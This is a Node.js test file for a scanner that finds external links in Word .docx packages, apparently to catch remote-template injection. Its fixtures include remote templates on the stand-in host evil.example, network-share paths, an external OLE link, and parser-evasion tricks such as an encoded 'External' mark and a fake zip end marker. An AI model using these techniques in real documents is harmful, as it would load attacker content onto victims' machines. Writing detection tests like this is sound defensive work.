const test = require('node:test');
const assert = require('node:assert');
const { inspectPackage } = require('../lib/doc-links');
const { buildZip, buildDocx, relsFile, inside, outside, REL } = require('./zip-builder');

const TEMPLATE = outside('rId1', 'attachedTemplate', 'http://evil.example/remote-template.dotm');

test('a plain document has no outside links', () => {
  assert.deepStrictEqual(inspectPackage(buildDocx([])), { isZip: true, unreadable: false, links: [] });
});

test('a remote template is found', () => {
  const found = inspectPackage(buildDocx([TEMPLATE]));
  assert.strictEqual(found.unreadable, false);
  assert.deepStrictEqual(found.links.map((l) => l.target), ['http://evil.example/remote-template.dotm']);
});

test('a linked picture and a network-share template are found too', () => {
  const found = inspectPackage(buildDocx([outside('rId2', 'image', 'file:///\\\\evil\\share\\a.png'), outside('rId3', 'attachedTemplate', '\\\\evil\\share\\t.dotm')]));
  assert.strictEqual(found.links.length, 2);
});

test('an ordinary clickable web link is allowed', () => {
  assert.deepStrictEqual(inspectPackage(buildDocx([outside('rId1', 'hyperlink', 'https://example.com/page')])).links, []);
});

test('links inside the document itself are allowed', () => {
  assert.deepStrictEqual(inspectPackage(buildDocx([inside('rId1', 'styles', 'styles.xml')])).links, []);
});

test('compressed parts are read too', () => {
  assert.strictEqual(inspectPackage(buildDocx([TEMPLATE], { deflate: true })).links.length, 1);
});

test('a ">" hidden inside a value cannot hide the "External" mark', () => {
  const sneaky = `<Relationship Id="rId1" Target="a>b" Type="${REL}/attachedTemplate" TargetMode="External"/>`;
  assert.strictEqual(inspectPackage(buildDocx([sneaky])).links.length, 1);
});

test('only a plain "Internal" mark counts as inside, so disguised spellings are refused', () => {
  const disguised = `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="&#69;xternal"/>`;
  assert.strictEqual(inspectPackage(buildDocx([disguised])).links.length, 1);
  const prefixed = `<r:Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/>`;
  assert.strictEqual(inspectPackage(buildDocx([prefixed])).links.length, 1);
  const single = `<Relationship Id='rId1' Type='${REL}/attachedTemplate' Target='http://evil.example/t.dotm' TargetMode='External'/>`;
  assert.strictEqual(inspectPackage(buildDocx([single])).links.length, 1);
});

test('a link hidden in any relationship file is found, not just the first one', () => {
  const zip = buildZip([
    { name: '_rels/.rels', data: relsFile(inside('rId1', 'officeDocument', 'word/document.xml')) },
    { name: 'word/_rels/document.xml.rels', data: relsFile(inside('rId1', 'styles', 'styles.xml')) },
    { name: 'word/_rels/footer1.xml.rels', data: relsFile(outside('rId1', 'oleObject', 'http://evil.example/x')) },
  ]);
  assert.strictEqual(inspectPackage(zip).links.length, 1);
});

test('a second, fake end-of-file marker hidden in the zip comment makes the file unreadable', () => {
  const fake = buildZip([{ name: '_rels/.rels', data: relsFile() }]); // a clean little zip tucked into the comment
  const tricky = buildDocx([TEMPLATE], { comment: fake });
  assert.strictEqual(inspectPackage(tricky).unreadable, true);
});

test('a cut-off or damaged zip is unreadable, never "clean"', () => {
  const whole = buildDocx([TEMPLATE]);
  assert.strictEqual(inspectPackage(whole.subarray(0, whole.length - 30)).unreadable, true);
  const damaged = Buffer.from(whole);
  damaged.writeUInt32LE(0x7fffffff, damaged.length - 22 + 16); // the directory "starts" far outside the file
  assert.strictEqual(inspectPackage(damaged).unreadable, true);
});

test('a relationship file that is not plain text is unreadable', () => {
  const zip = buildZip([{ name: 'word/_rels/document.xml.rels', data: Buffer.from('<\0R\0e\0l\0') }]);
  assert.strictEqual(inspectPackage(zip).unreadable, true);
});

test('a part that unpacks to something huge is unreadable', () => {
  const zip = buildZip([{ name: 'word/_rels/document.xml.rels', data: Buffer.alloc(5 * 1024 * 1024, 0x20) }], { deflate: true });
  assert.strictEqual(inspectPackage(zip).unreadable, true);
});

test('something that is not a zip says so', () => {
  assert.deepStrictEqual(inspectPackage(Buffer.from('{\\rtf1 hello}')), { isZip: false, unreadable: false, links: [] });
  assert.deepStrictEqual(inspectPackage(Buffer.alloc(0)), { isZip: false, unreadable: false, links: [] });
});
